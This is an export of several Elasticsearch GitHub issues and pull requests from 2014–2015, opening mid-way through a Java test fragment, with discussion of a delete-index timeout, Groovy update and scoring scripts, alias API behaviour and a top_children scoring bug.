3877943405A8717807EC25ADBDE\",\"532150BA73844BEBA101B4EED9D9AD97\",\"5D2F1F0B6B09476BA7657F436C279207\",\"8A2F58C04C994D61A087D3F727EF73C6\",\"8054C6A5A0D6410D94B466DE013EECCE\",\"D166F80523A840FFB18CA85243DDB112\",\"C065B002179C481BBC1BF80FE87642BF\",\"096144BAFCDE416D89D0A5107163D11A\",\"D99DCC1027854A4A922C37DFCCA383DC\",\"BBF3316A0A1342EFB0AB2AE855D749DD\",\"EE4A459BED5C42928B60A357BA6D1363\",\"3994E00006CA49F78BCFB017DD5F01C4\"],\"shape\":\"Any Shape\",\"shipmentDate\":\"2014-12-02\",\"tradeRef\":\"edm-trade-id\",\"trafficOperatorFullName\":\"Unknown User\",\"trafficOperatorSid\":\"UNKNOWN-USER-SID-E01323877943405A8717807EC25ADBDE\",\"unallocatedQuantity\":1000.0000,\"unallocatedQuantityNormalised\":1000.0000,\"unallocatedQuantityNormalisedUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\",\"unallocatedQuantityUnitOfMeasure\":\"\uE697\uDB31\uDD41\\u0013\u00A3\u04C8\uE215\"}");

        refresh();

        String searchSource1 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":[{\"prefix\":{\"_all\":{\"prefix\":\"0#\"}}},{\"prefix\":{\"_all\":{\"prefix\":\"(99.995%)\"}}},{\"prefix\":{\"_all\":{\"prefix\":\"sand\"}}}]}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource2 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"tic-p.26884tshs\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource3 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":[{\"prefix\":{\"_all\":{\"prefix\":\"corporacion\"}}},{\"prefix\":{\"_all\":{\"prefix\":\"de\"}}},{\"prefix\":{\"_all\":{\"prefix\":\"acero\"}}},{\"prefix\":{\"_all\":{\"prefix\":\"\\\"corpacero\\\"\"}}}]}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource4 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"99.97%\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource5 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"acme\u2122\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource6 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"flat(square)\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource7 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"99.97\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource8 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"99.995\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource9 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"99.995%\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource10 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"0#\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";
        String searchSource11 = "{\"from\":0,\"size\":1000,\"query\":{\"filtered\":{\"query\":{\"bool\":{\"must\":{\"prefix\":{\"_all\":{\"prefix\":\"nofindy\"}}}}},\"filter\":{\"and\":{\"filters\":[{\"type\":{\"value\":\"quota\"}},{\"terms\":{\"groupCompanyId\":[\"D99DCC1027854A4A922C37DFCCA383DC\",\"NO_GROUP_COMPANY\"]}}]}}}},\"aggregations\":{\"aggregated_quantity_allocatedQuantityNormalised\":{\"sum\":{\"field\":\"allocatedQuantityNormalised\"}},\"aggregated_quantity_quantityNormalised\":{\"sum\":{\"field\":\"quantityNormalised\"}},\"aggregated_quantity_unallocatedQuantityNormalised\":{\"sum\":{\"field\":\"unallocatedQuantityNormalised\"}}}}";

        List&lt;String&gt; searchSources = newArrayList(
            searchSource1,
            searchSource2,
            searchSource3,
            searchSource4,
            searchSource5,
            searchSource6,
            searchSource7,
            searchSource8,
            searchSource9,
            searchSource10,
            searchSource11
        );

        for (String searchSource : searchSources)
        {
            SearchResponse response = client()
                .prepareSearch(INDEX)
                .setSource(searchSource)
                .execute()
                .actionGet();
        }
    }

    private String prettyPrint(String aggregationSource) throws IOException
    {
        return json.writerWithDefaultPrettyPrinter().writeValueAsString(json.readValue(aggregationSource, Map.class));
    }
}
```
</comment><comment author="mikemccand" created="2014-11-18T17:07:22Z" id="63505911">@nickminutello indeed that test only creates a tiny index.

In #8528 we were seeing this same issue (not caused by #8405) and as far as I can tell it was just a "IO system is too slow", i.e. there are not apparent thread deadlocks.  It's just that the flush took &gt; 30 seconds ... so your theory that your heavily loaded build box could lead to this timeout makes sense.

The time is DeleteIndexRequest.setTimeout() but that's being created &amp; sent/ack'd inside TestCluster.wipeIndices and I don't think TestCluster has a way to set the timeout on that request.

You could also try disabling check index for your test (set MockFSDirectoryService.CHECK_INDEX_ON_CLOSE to false in your settings when you create the index)... that prevents the test infra from doing a flush after the test finishes.
</comment><comment author="nickminutello" created="2014-11-20T09:25:06Z" id="63781078">Is the 30s a default timeout for all requests? Is the default timeout configurable?

I will try disable the check to see if that helps.  
</comment><comment author="nickminutello" created="2014-11-26T16:08:34Z" id="64668567">I havent had a chance to try disabling the check yet.
But where does this 30s come from?
</comment><comment author="mikemccand" created="2014-11-26T16:30:51Z" id="64672285">&gt; But where does this 30s come from?

I explained this above:

&gt; The time is DeleteIndexRequest.setTimeout() but that's being created &amp; sent/ack'd inside TestCluster.wipeIndices and I don't think TestCluster has a way to set the timeout on that request.
</comment><comment author="nickminutello" created="2014-11-26T16:43:22Z" id="64674327">I guess I am not expressing my question properly - or I am not understanding your answer - either way, apologies and thanks for the patience.

I guess what I am trying to say is I dont see any explicit call to DeleteIndexRequest.setTimeout()
What I see is:

``` java
 assertAcked(client().admin().indices().prepareDelete(indices));
```

So it looks to me like no timeout is being set?
So my question is where _is_ it being set/defaulted?

Sorry if I am being slow...
</comment><comment author="mikemccand" created="2014-11-27T11:09:23Z" id="64776956">&gt; So my question is where is it being set/defaulted?

DeleteIndexRequest inherits setTimeout from MasterNodeOperationRequest, and if you look at the sources for that class you see it has an instance variable "timeout" that is initialized to 30 sec.

You could perhaps just invoke the delete index from the end of your test case, and at that point set a larger timeout?
</comment><comment author="clintongormley" created="2015-02-28T04:54:07Z" id="76510661">No more info provided. Closing for now
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NullPointerException in update api when try to add item to a non-existing list</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7797</link><project id="" key="" /><description>I want to add items as nested-type to a list in an existing document, but I get this error message:

ElasticsearchIllegalArgumentException[failed to execute script]; nested: GroovyScriptExecutionException[NullPointerException[Cannot execute null+null]];

The document exist but it does not contains a nested list/array. 
Is this a bug or how can I write a update script there create the list if it not exist?

---

Create document:

``` JSON
PUT test/mytype/myid
{
  "name": "TestName"
}
```

Update there fail:

``` JSON
POST test/mytype/myid/_update?lang=groovy
{
  "script": "ctx._source.tags += newtag;",
  "params": {
    "newtag": [{
      "value": 7,
      "innerName": "John"
    }]
  }
}
```

Mapping:

``` JSON
POST test/_mapping/mytype
{
  "properties": {
     "name": {
        "type": "string"
     },
     "tags": {
       "type": "nested",
        "properties": {
           "innerName": {
              "type": "string"
           },
           "value": {
              "type": "long"
           }
        }
     }
  }
}
```
</description><key id="43221067">7797</key><summary>NullPointerException in update api when try to add item to a non-existing list</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">rasmus-telerik</reporter><labels /><created>2014-09-19T09:36:59Z</created><updated>2015-06-26T13:22:54Z</updated><resolved>2014-09-19T09:47:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-09-19T09:47:53Z" id="56157582">@rasmus-telerik your script needs to check for the existence of the field, using `+=` without qualification is the same as `null + &lt;object&gt;`.

Here's your example with a working script: https://gist.github.com/dakrone/432f2800eb83939114e5
</comment><comment author="rasmus-telerik" created="2014-09-19T09:55:16Z" id="56158261">Thanks for extreme fast feedback and the working example.
</comment><comment author="CamiloSierraH" created="2015-06-26T13:19:10Z" id="115680047">@dakrone i had the same problem, if is not a issue, maybe the documentation need to be updated if upsert cant be used in update script ? https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-update.html#upserts
because when i read the doc i understand and i tried the same code that @rasmus-telerik !
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adding 'y' and 'M' to fuzziness parameter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7796</link><project id="" key="" /><description>Idea about how to add year and month as parameters to fuzziness search.
Without having to lock the M to 30 days and Year to 365 or something like that.
</description><key id="43213920">7796</key><summary>Adding 'y' and 'M' to fuzziness parameter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">cfontes</reporter><labels><label>feedback_needed</label><label>review</label></labels><created>2014-09-19T07:57:19Z</created><updated>2016-03-08T15:21:52Z</updated><resolved>2016-03-08T15:21:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-07T11:51:21Z" id="58172566">hey, thanks for opening this I was wondering why you didn't just extend `TimeValue#parseTimeValue()` to support `M` and `y`? this should then just work out of the box? I'd also love to see a simple testcase for this.
</comment><comment author="cfontes" created="2014-10-07T17:18:39Z" id="58222191">Hi, S1monw. Thanks for the review.

This pull was more of a POC (see #7666) to see if you guys were OK with the assumption that Joda makes to calcutate +1M and +1Y. Which is this:

&lt;blockquote&gt;&lt;pre&gt;
Returns a copy of this datetime minus the specified number of months.
The calculation will do its best to only change the month field 
retaining the same day of month. 
However, in certain circumstances, it may be necessary to alter smaller fields.
For example, 2007-05-31 minus one month cannot result in 2007-04-31, 
so the day of month is adjusted to 2007-04-30.
The following three lines are identical in effect:
 DateTime subtracted = dt.minusMonths(6);
 DateTime subtracted = dt.minus(Period.months(6));
 DateTime subtracted = dt.withFieldAdded(DurationFieldType.months(), -6);
 
This datetime instance is immutable and unaffected by this method call.
&lt;/pre&gt;&lt;/blockquote&gt;

Since I understand that you are ok with it. I will work on a more polished solution, probably as a part of `TimeValue#parseTimeValue()` with some tests as you said.

Cheers!
</comment><comment author="s1monw" created="2014-10-22T12:43:42Z" id="60078425">@cfontes any updates on this?
</comment><comment author="cfontes" created="2014-10-22T13:09:15Z" id="60081460">@s1monw I couldn't work on it yet. 

I am under some pressure right now.

I still want to do it. I just don't have the time until next week.

Cheers!
</comment><comment author="s1monw" created="2015-03-23T10:18:23Z" id="84932752">@cfontes ping
</comment><comment author="cfontes" created="2015-03-23T20:21:33Z" id="85176781">Hey, @s1monw . Shit I completely forgot about it.

I will take a look at it this week (tonight I hope)
</comment><comment author="s1monw" created="2015-03-23T20:22:37Z" id="85177343">@cfontes welcome back :)
</comment><comment author="cfontes" created="2015-04-24T18:02:13Z" id="96015069">Hi, sorry for the delay again. 

I think this should be made into 2 changes... One only for the fuzzy search and another for the common parser.

Mostly because I like having the range expanding for the fuzzy search like it is today.

By that I mean, If you use `1M` in Fuzzy search it will search the range : `today - 1 Month` to `today + 1 Month` (Joda months). Which is also the behaviour documented here http://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-fuzzy-query.html#_numeric_and_date_fields

The time parsers to me looks more like : `today - 1 Month`.

What do you think?

So in this pull I could add some tests ( I am trying to figure how to do it, I have a hard time creating tests on ElasticSearch code... ) and maybe create another pull for the parser with some parser tests. Like this I can finally close this and enjoy the accomplishment feeling it will give me.
</comment><comment author="clintongormley" created="2016-03-08T15:21:52Z" id="193822153">A long time has passed since this PR was initially proposed, and a lot has changed since then. I'm going to close this for now but please feel free to re-propose based on the current master.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] move REST tests to their own test group</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7795</link><project id="" key="" /><description /><key id="43213768">7795</key><summary>[TEST] move REST tests to their own test group</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-19T07:54:52Z</created><updated>2014-09-19T08:36:39Z</updated><resolved>2014-09-19T08:36:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-19T08:14:45Z" id="56149126">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>In the code there is the `d` option for time values for fuzzyness ranges</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7794</link><project id="" key="" /><description>Documenting a behaviour that is present in the code and works.
</description><key id="43200776">7794</key><summary>In the code there is the `d` option for time values for fuzzyness ranges</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">cfontes</reporter><labels /><created>2014-09-19T03:22:38Z</created><updated>2014-09-30T14:13:53Z</updated><resolved>2014-09-25T17:10:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:09:37Z" id="56850944">thanks @cfontes - merged!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ignore_missing removed from _aliases</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7793</link><project id="" key="" /><description>Continuing discussion from:
https://github.com/elasticsearch/elasticsearch/pull/7234#issuecomment-55948380

It appears that the recent Get Indices API removes ignore_missing:

Elasticsearch 1.3.2

```
curl -XGET  http://localhost:9200/logstash-2014.09.16,logstash-2014.09.17/_aliases?ignore_missing=true;echo
{"logstash-2014.09.16":{"aliases":{}}}
```

Elasticsearch 1.4 branch

```
$ curl -XGET  http://localhost:9200/logstash-2014.09.16,logstash-2014.09.17/_aliases?ignore_missing=true;echo
{"error":"IndexMissingException[[logstash-2014.09.17] missing]","status":404}
```

Technically ignore_missing was slated for removal in Elasticsearch 1.0 (http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/_parameters.html#_parameters), however it was not removed from this API, meaning this this will introduce a breaking change for 1.4. 

It might be better to deprecate ignore_missing and remove it in Elasticsearch 2.0.
</description><key id="43190607">7793</key><summary>ignore_missing removed from _aliases</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rashidkpc</reporter><labels><label>breaking</label><label>v1.4.0.Beta1</label></labels><created>2014-09-18T23:39:10Z</created><updated>2014-09-26T09:28:25Z</updated><resolved>2014-09-22T10:15:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-22T10:15:51Z" id="56353897">The ignore_missing option was removed in 1.0 and in 1.3.2 the flag had not effect (including it or not including it gave the same response). The change in 1.4 was that the API now fully handles IndicesOptions and the default is not to ignore unavailable indices (whereas in 1.3 it would ignore unavailable indices). 

The breaking changes documentation was updated in #7786 to more clearly explain the change here
</comment><comment author="kevinkluge" created="2014-09-24T20:31:38Z" id="56733816">I like Rashid's original proposal to just deprecate ignore_missing and not actually remove it until ES 2.0.  We know that this change breaks Kibana 3.x and it's possible it will break other apps people have written.  

This is a weird situation, where the docs said it was removed but it really wasn't.  I get the argument that this is just a bug fix, but I think our users would be better off if we didn't break this in a minor release like 1.4.
</comment><comment author="javanna" created="2014-09-25T08:51:20Z" id="56790918">&gt; I like Rashid's original proposal to just deprecate ignore_missing and not actually remove it until ES 2.0. 

Let me try to clarify what happened, the `ignore_missing` parameter was actually never supported by this specific api/endpoint. Its behaviour was lenient and not configurable, meaning that the parameter was just being ignored. This api was inconsistent given that its behaviour didn't support our common multi indices options (neither `ignore_missing` nor `ignore_unavailable`) and its default was different from the other api (lenient instead of strict).

The only thing we could technically do is keep the inconsistent default and make it lenient if no parameters are specified, but that would mean that the get indices api, the single api that rules them all, would need to have a different behaviour only when returning aliases? That doesn't really make sense to me.

That said, I see this as a bugfix which ended up changing the default behaviour of the aliases endpoint, which is now strict instead of lenient, but configurable. If the fact that the change is breaking we should maybe consider taking the get indices api as a whole out of `1.x`?
</comment><comment author="clintongormley" created="2014-09-25T18:41:06Z" id="56864041">Given that the `GET _aliases` is a widely used API, and this change does break bwc, I suggest we keep it lenient for 1.x (ie default `ignore_unavailable` to `true`), but deprecate this, and change the behaviour in master.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Try to increment store before searcher is acquired</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7792</link><project id="" key="" /><description>InternalEngine#refreshNeeded must increment the ref count on the
store used before it's checking if the searcher is current since
internally a searcher ref is acquired and if that happens concurrently
to a engine close it might violate the assumption that all files
are closed when the store is closed.

This commit also converts some try / finally into try / with.
</description><key id="43186379">7792</key><summary>Try to increment store before searcher is acquired</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Store</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T22:38:09Z</created><updated>2015-06-07T12:01:30Z</updated><resolved>2014-09-18T22:48:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-18T22:42:47Z" id="56113982">LGTM
</comment><comment author="kimchy" created="2014-09-18T22:47:19Z" id="56114392">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>top_children and function_score / script_score don't play nice together</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7791</link><project id="" key="" /><description>Consider the following scenario, executed with 1.3.2:

``` json
DELETE /test

PUT /test
{
  "settings": {"number_of_replicas": 0,"number_of_shards": 1}, 
  "mappings": {
    "tagged-page":{
        "_parent": {
           "type": "pages"
        },
        "properties": {
            "name": {
              "type": "string","index": "not_analyzed"
            },
            "score": {
              "type": "float"
            }
        }
    },
    "pages": {
      "properties": {
        "title":{"type": "string", "index": "no" }
      }
    }
  }
}

POST /test/pages/1
{
    "title":"page1"
}

POST /test/tagged-page?parent=1
{
    "name":"foo", "score":1.0
}

POST /test/tagged-page?parent=1
{
    "name":"bar", "score":5.0
}

POST /test/pages/2
{
    "title":"page2"
}

POST /test/tagged-page?parent=2
{"name":"cafe", "score":5.0 }

POST /test/tagged-page?parent=2
{"name":"bar", "score":1.0}

POST /test/pages/3
{
    "title":"page3"
}

POST /test/tagged-page?parent=3
{"name":"foo", "score":100.0 }

POST /test/tagged-page?parent=3
{"name":"bar", "score":3.0}

POST /test/pages/4
{
    "title":"page4"
}

POST /test/tagged-page?parent=4
{"name":"foo", "score":5.0 }

POST /test/tagged-page?parent=4
{"name":"bar", "score":20.0}

POST /test/pages/5
{
    "title":"page5"
}

POST /test/tagged-page?parent=5
{"name":"foo", "score":3.0 }

POST /test/pages/6
{
    "title":"page6"
}

POST /test/tagged-page?parent=6
{"name":"cafe", "score":2.0}

POST /test/_refresh

POST /test/pages/_search
{
  "query": {
    "top_children" : {
        "type": "tagged-page",
        "query": {
            "function_score": {
                "query": {
                    "term": {
                        "name": "foo"
                    }
                },
                "script_score": {
                    "lang" : "groovy",
                    "script": "doc[\"score\"].value"
                }
            }
        },
        "score" : "max",
        "factor" : 5,
        "incremental_factor" : 2
    }
  }
}
```

I get the following error:

``` json
{
   "error": "SearchPhaseExecutionException[Failed to execute phase [query_fetch], all shards failed; shardFailures {[BDBL4U4jTbCVsGvmCYzGpg][test][0]: QueryPhaseExecutionException[[test][0]: query[filtered(score_child[tagged-page/pages](filtered(function score (name:foo,function=script[doc[\"score\"].value], params [null]))-&gt;cache(_type:tagged-page)))-&gt;cache(_type:pages)],from[0],size[10]: Query Failed [Failed to execute main query]]; nested: RuntimeException[org.elasticsearch.script.groovy.GroovyScriptExecutionException: ElasticsearchIllegalArgumentException[No field found for [score] in mapping with types [pages]]]; nested: GroovyScriptExecutionException[ElasticsearchIllegalArgumentException[No field found for [score] in mapping with types [pages]]]; }]",
   "status": 500
}
```

Note the `No field found for [score] in mapping with types [pages]`. Meaning, function_score was trying to execute the script_score within the context of the query to pages, instead of against the internal query to tagged-page as I would expect.
</description><key id="43154201">7791</key><summary>top_children and function_score / script_score don't play nice together</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">synhershko</reporter><labels><label>bug</label><label>stalled</label></labels><created>2014-09-18T16:44:38Z</created><updated>2015-11-21T19:04:47Z</updated><resolved>2015-11-21T19:04:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-18T17:52:59Z" id="56076885">@synhershko Thanks for opening this. This is a bug also the `has_child` query suffers from the same problem. If the document type has already been set in the url then fields of other types can't be resolved via a script in any (sub) query.
